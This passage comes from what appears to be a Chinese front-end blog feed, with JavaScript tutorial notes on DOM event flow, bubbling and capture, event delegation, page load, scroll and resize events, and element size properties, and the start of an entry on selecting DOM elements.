class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>事件流<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>事件流是事件在执行时的底层机制，主要体现在父子盒子之间事件的执行上。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;outer&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;inner&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;child&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 获取嵌套的3个节点</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> outer = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.outer&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> inner = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.inner&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> child = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.child&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// html 元素添加事件</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;html...&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// body 元素添加事件</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;body...&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 外层的盒子添加事件</span></span></span><br><span class="line"><span class="language-javascript">outer.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;outer...&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 中间的盒子添加事件</span></span></span><br><span class="line"><span class="language-javascript">inner.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;inner...&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 内层的盒子添加事件</span></span></span><br><span class="line"><span class="language-javascript">child.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;child...&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>执行上述代码后发现，当单击事件触发时，其祖先元素的单击事件也<strong>相继触发</strong></p><p>结合事件流的特征，我们知道当某个元素的事件被触发时，事件总是会先经过其祖先才能到达当前元素，然后再由当前元素向祖先传递，事件在流动的过程中遇到相同的事件便会被触发。</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240131164303.png" alt="image.png"></p><p>再来关注一个细节就是事件相继触发的<strong>执行顺序</strong>，事件的执行顺序是<strong>可控制的</strong>，即可以在捕获阶段被执行，也可以在冒泡阶段被执行。</p><p>如果事件是在冒泡阶段执行的，我们称为<strong>冒泡模式</strong>，它会先执行子盒子事件再去执行父盒子事件，<strong>默认是冒泡模式</strong>（如上图所示）。</p><p>如果事件是在捕获阶段执行的，我们称为<strong>捕获模式</strong>，它会先执行父盒子事件再去执行子盒子事件。</p><p>将第三个参数改为<code>true</code>，即捕获模式</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240131164438.png" alt="image.png"></p><p>结论：</p><ol><li><code>addEventListener</code> 第3个参数决定了事件是在捕获阶段触发还是在冒泡阶段触发</li><li><code>addEventListener</code> 第3个参数为 <code>true</code> 表示捕获阶段触发，<code>false</code> 表示冒泡阶段触发，默认值为 <code>false</code></li><li>事件流只会在父子元素具有相同事件类型时才会产生影响</li><li>绝大部分场景都采用默认的冒泡模式（其中一个原因是早期 IE 不支持捕获）</li></ol><h2 id="阻止冒泡"><a href="#阻止冒泡" class="headerlink" title="阻止冒泡"></a>阻止冒泡</h2><p><strong>阻止冒泡</strong>是指阻断事件的流动，保证事件只在当前元素被执行，而不再去影响到其对应的祖先元素。</p><p><code>事件对象.stopPropagation()</code></p><p>注意：前提是阻止事件对象冒泡需要拿到事件对象，在冒泡模式和捕获模式均有效</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>阻止冒泡<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>阻止冒泡是指阻断事件的流动，保证事件只在当前元素被执行，而不再去影响到其对应的祖先元素。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;outer&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;inner&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;child&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 获取嵌套的3个节点</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> outer = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.outer&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> inner = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.inner&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> child = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.child&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 外层的盒子</span></span></span><br><span class="line"><span class="language-javascript">outer.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;outer...&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 中间的盒子</span></span></span><br><span class="line"><span class="language-javascript">inner.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">ev</span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;inner...&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 阻止事件冒泡</span></span></span><br><span class="line"><span class="language-javascript">ev.<span class="title function_">stopPropagation</span>()</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 内层的盒子</span></span></span><br><span class="line"><span class="language-javascript">child.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">ev</span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;child...&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 借助事件对象，阻止事件向上冒泡</span></span></span><br><span class="line"><span class="language-javascript">ev.<span class="title function_">stopPropagation</span>()</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>结论：事件对象中的 <code>ev.stopPropagation</code> 方法，专门用来<strong>阻止事件冒泡</strong>。</p><p>有时候需要<strong>阻止默认行为</strong>的发生，例如阻止链接跳转，表单域跳转等，就需要使用另一个</p><p><code>e.preventDefault()</code></p><p>可以阻止默认行为</p><h2 id="解绑事件"><a href="#解绑事件" class="headerlink" title="解绑事件"></a>解绑事件</h2><p>on事件方式，直接使用null覆盖就可以实现事件的解绑</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">btn.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;点击了！&#x27;</span>)</span><br><span class="line">btn.<span class="property">onclick</span> = <span class="literal">null</span>  <span class="comment">// 实现只能点击一次的效果</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果是使用了<code>addEventListener()</code>方式，必须使用：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;点击了！&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 绑定事件</span></span><br><span class="line">btn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, fn)</span><br><span class="line"><span class="comment">// 解绑事件</span></span><br><span class="line">btn.<span class="title function_">removeEventListener</span>(<span class="string">&#x27;click&#x27;</span>, fn)</span><br></pre></td></tr></table></figure><p>注意：匿名函数无法被解绑</p><p> 鼠标经过事件：</p><ul><li><code>mouseover</code> 和 <code>mouseout</code> 会有冒泡效果</li><li><code>mouseenter</code> 和 <code>mouseleave</code> 没有冒泡效果 (推荐)</li></ul><p><strong>两种注册事件的区别：</strong></p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240131193930.png" alt="image.png"></p><h1 id="事件委托"><a href="#事件委托" class="headerlink" title="事件委托"></a>事件委托</h1><p>事件委托是利用事件流的特征解决一些现实开发需求的知识技巧，主要的作用是提升程序效率。</p><p><strong>原理</strong>：</p><ul><li>给父元素注册事件，当我们触发子元素的时候，会冒泡到父元素身上，从而触发父元素的事件</li></ul><p>实现：</p><ul><li><code>事件对象.target.tagName</code>可以获得真正触发事件的元素</li></ul><p>大量的事件监听是比较耗费性能的，如下代码所示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 假设页面中有 10000 个 button 元素</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> buttons = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;table button&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 用传统for循环实现，程序性能消耗大</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= buttons.<span class="property">length</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 为 10000 个 button 元素添加了事件</span></span></span><br><span class="line"><span class="language-javascript">buttons[i].<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 省略具体执行逻辑...</span></span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 使用事件委托优化，假设上述的 10000 个 buttom 元素共同的祖先元素是 table</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> parents = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;table&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">parents.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">ev</span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// console.log(ev.target);</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 只有 button 元素才会真正去执行逻辑</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">if</span>(ev.<span class="property">target</span>.<span class="property">tagName</span> === <span class="string">&#x27;BUTTON&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 执行的逻辑</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>事件对象中的属性 <code>target</code> 或 <code>srcElement</code>属性表示真正触发事件的元素，它是一个元素类型的节点。</p><p>优化过的代码只对祖先元素添加事件监听，相比对 10000 个元素添加事件监听执行效率要高许多！！！</p><h1 id="其他事件"><a href="#其他事件" class="headerlink" title="其他事件"></a>其他事件</h1><h2 id="页面加载事件"><a href="#页面加载事件" class="headerlink" title="页面加载事件"></a>页面加载事件</h2><p>加载外部资源（如图片、外联CSS和JavaScript等）加载完毕时触发的事件</p><p>有些时候需要等页面资源全部处理完了做一些事情</p><p><strong>事件名</strong>：<code>load</code></p><p>监听页面所有资源加载完毕：</p><ul><li>给<code>window</code>添加<code>load</code>事件</li></ul><p>不光可以监听整个页面资源加载完毕，也可以针对某个资源绑定load事件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 执行的操作</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>当初始的HTML文档被完全加载和解析完成之后，<code>DOMContentLoaded</code>事件被触发，而无需等待样式表、图像等完全加载</p><p><strong>事件名</strong>：<code>DOMContentLoaded</code></p><p>监听页面DOM加载完毕：</p><ul><li>给<code>document</code>添加<code>DOMContentLoaded</code>事件</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="comment">// 执行的操作</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="元素滚动事件"><a href="#元素滚动事件" class="headerlink" title="元素滚动事件"></a>元素滚动事件</h2><p>滚动条在滚动的时候持续触发的事件</p><p>很多网页需要检测用户把网页滚动到某个位置后做一些处理，比如固定导航栏、返回顶部等</p><p><strong>事件名</strong>：<code>scroll</code></p><p>监听整个页面滚动：</p><ul><li>给<code>window</code>或<code>document</code>添加<code>scroll</code>事件</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;scroll&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 执行的操作</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li>监听某个元素的内部滚动，直接给某个元素添加即可</li></ul><h3 id="获取位置"><a href="#获取位置" class="headerlink" title="获取位置"></a>获取位置</h3><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240131201259.png" alt="image.png"></p><ul><li><code>scrollLeft</code>和<code>scrollTop</code>（属性）<ul><li>获取被卷去的大小</li><li>获取元素内容往左、往上滚出去看不见的距离</li><li>这两个值是可读写的</li></ul></li><li>尽量在<code>scroll</code>事件里面获取被卷去的距离</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="title function_">addEventListener</span>(<span class="string">&#x27;scroll&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">scrollTop</span>)  <span class="comment">// 获取到顶部的距离</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;scroll&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="comment">// document.documentElement 是HTML元素获取方式</span></span><br><span class="line">    <span class="keyword">const</span> n = <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollTop</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(n)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>注意：<code>document.documentElement</code> HTML文档返回对象为HTML元素</p><h3 id="滚动到指定坐标"><a href="#滚动到指定坐标" class="headerlink" title="滚动到指定坐标"></a>滚动到指定坐标</h3><p>scrollTo()方法可以将内容滚动到指定的坐标</p><p><strong>语法</strong>：<code>元素.scrollTo(x, y)</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">scrollTo</span>(<span class="number">0</span>, <span class="number">1000</span>)</span><br></pre></td></tr></table></figure><h2 id="页面尺寸事件"><a href="#页面尺寸事件" class="headerlink" title="页面尺寸事件"></a>页面尺寸事件</h2><p>会在窗口尺寸改变的时候触发事件：</p><p><strong>事件名</strong>：<code>resize</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;resize&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 检测屏幕宽度</span></span><br><span class="line">    <span class="keyword">let</span> w = <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientWidth</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(w)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li>获取宽高<ul><li>获取元素的可见部分宽高（不包括边框、margin、滚动条等）</li><li><code>clientWidth</code>和<code>clientHeight</code></li></ul></li></ul><h1 id="元素尺寸与位置"><a href="#元素尺寸与位置" class="headerlink" title="元素尺寸与位置"></a>元素尺寸与位置</h1><ul><li><p><strong>获取宽高</strong>：</p><ul><li>获取元素的自身宽高、包含元素自身设置的宽高、padding、border</li><li><code>offsetWidth</code>和<code>offsetHeight</code></li><li>获取出来的是数值,方便计算</li><li>注意：获取的是可视宽高, 如果盒子是隐藏的,获取的结果是0</li></ul></li><li><p>获取位置：</p><ul><li>获取元素距离自己定位父级元素的左、上距离</li><li><code>offsetLeft</code>和<code>offsetTop</code></li><li>注意是只读属性</li></ul></li></ul><p><code>element.getBoundingClientRect()</code>方法返回元素的大小及其相对于视口的位置</p><table><thead><tr><th>属性</th><th>作用</th><th>说明</th></tr></thead><tbody><tr><td>scrollLeft和scrollTop</td><td>被卷去的头部和左侧</td><td>配合页面滚动来用，可读写</td></tr><tr><td>clientWidth和clientHeight</td><td>获得元素宽度和高度</td><td>不包含border，margin，滚动条<br>用于js获取元素大小，只读属性</td></tr><tr><td>offserWidth和offsetHeight</td><td>获取元素宽度和高度</td><td>包含border，padding，滚动条等，只读</td></tr><tr><td>offsetLeft和offsetTop</td><td>获取元素距离自己定位父级元素的左、上距离</td><td>获取元素位置的时候使用，只读属性</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> WebAPIs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript-DOM获取、属性操作</title>
      <link href="/2024/01/29/JavaScript-DOM%E8%8E%B7%E5%8F%96%E3%80%81%E5%B1%9E%E6%80%A7%E6%93%8D%E4%BD%9C/"/>
      <url>/2024/01/29/JavaScript-DOM%E8%8E%B7%E5%8F%96%E3%80%81%E5%B1%9E%E6%80%A7%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="Web-APIs-认知"><a href="#Web-APIs-认知" class="headerlink" title="Web APIs 认知"></a>Web APIs 认知</h1><h2 id="作用和分类"><a href="#作用和分类" class="headerlink" title="作用和分类"></a>作用和分类</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240128150153.png" alt="image.png"></p><ul><li>作用：就是使用JS去操作html和浏览器</li><li>分类：DOM（文档对象模型）、BOM（浏览器对象模型）</li></ul><h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><p><strong>DOM</strong>（Document Object Model - 文档对象模型）是将整个 HTML 文档的每一个标签元素视为一个对象，这个对象下包含了许多的属性和方法，通过操作这些属性或者调用这些方法实现对 HTML 的动态更新，为实现网页特效以及用户交互提供技术支撑。</p><p>简单的说：DOM是浏览器提供的一套专门用来<strong>操作网页内容</strong>的功能</p><p><strong>作用</strong>：开发网页内容特效和实现用户交互</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/demo.gif" alt="demo.gif"></p><h2 id="DOM树"><a href="#DOM树" class="headerlink" title="DOM树"></a>DOM树</h2><ul><li>将HTML文档以树状结构直观表现出来，称为文档树或<strong>DOM树</strong></li><li>描述网页内容关系的名词</li><li>作用：直观地体现了标签与标签之间的关系</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/web-api.jpg" alt="web-api.jpg"></p><h2 id="DOM对象"><a href="#DOM对象" class="headerlink" title="DOM对象"></a>DOM对象</h2><p>DOM对象：浏览器根据html标签生成的JS对象</p><ul><li>所以的标签属性都可以在这个对象上找到</li><li>修改这个对象的属性会自动映射到标签上</li></ul><h3 id="document"><a href="#document" class="headerlink" title="document"></a>document</h3><p><code>document</code> 是 DOM 里提供的一个对象，该对象包含了若干的属性和方法，<code>document</code> 是学习 DOM 的核心。</p><p>是用来访问和操作网页内容的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// document 是内置的对象</span></span><br><span class="line"><span class="comment">// console.log(typeof document);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 通过 document 获取根节点</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">documentElement</span>); <span class="comment">// 对应 html 标签</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 通过 document 节取 body 节点</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">body</span>); <span class="comment">// 对应 body 标签</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 通过 document.write 方法向网页输出内容</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;Hello World!&#x27;</span>);</span><br></pre></td></tr></table></figure><h1 id="获取DOM元素"><a href="#获取DOM元素" class="headerlink" title="获取DOM元素"></a>获取DOM元素</h1><ol><li><p><code>querySelector</code> 满足条件（一个或多个CSS选择器）的<strong>第一个元素</strong></p></li><li><p><code>querySelectorAll</code> 满足条件（一个或多个CSS选择器）的元素集合，返回<strong>伪数组</strong></p><ul><li>伪数组：有长度和索引号的数组，但是没有<code>pop()</code>、<code>push()</code>等方法</li><li>就算只有一个，也是返回一个伪数组</li></ul></li><li><p>了解其他方式</p><ul><li><code>getElementById</code>：根据id获取一个元素</li><li><code>getElementsByTagName</code>：根据标签获取一类元素</li><li><code>getElementByClassName</code>：根据类名获取元素</li></ul></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM - 查找节点<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span 